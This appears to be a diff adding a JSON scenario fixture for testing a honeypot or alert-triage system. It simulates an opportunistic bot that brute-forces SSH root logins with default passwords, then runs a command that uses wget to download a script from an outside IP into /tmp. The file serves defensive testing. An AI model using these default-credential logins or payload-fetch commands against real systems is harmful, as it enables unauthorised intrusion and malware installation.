@@ -1,0 +1,30 @@
+{
+  "id": "opportunistic",
+  "name": "Scripted bot that got in",
+  "persona": "bot",
+  "seed": 21,
+  "narration": "Brute-forces, logs in with common creds, then runs a short scripted command sequence with no human-like gaps — gets in but stays automated. Expected High, labelled Opportunistic, batched not paged.",
+  "steps": [
+    { "kind": "ssh", "action": "connect" },
+    {
+      "kind": "ssh",
+      "action": "login",
+      "username": "root",
+      "password": "toor",
+      "expect": "fail",
+      "repeat": 3
+    },
+    {
+      "kind": "ssh",
+      "action": "login",
+      "username": "root",
+      "password": "root",
+      "expect": "success"
+    },
+    {
+      "kind": "ssh",
+      "action": "command",
+      "cmd": "uname -a; wget http://198.51.100.9/y.sh -O /tmp/y.sh"
+    }
+  ]
+}
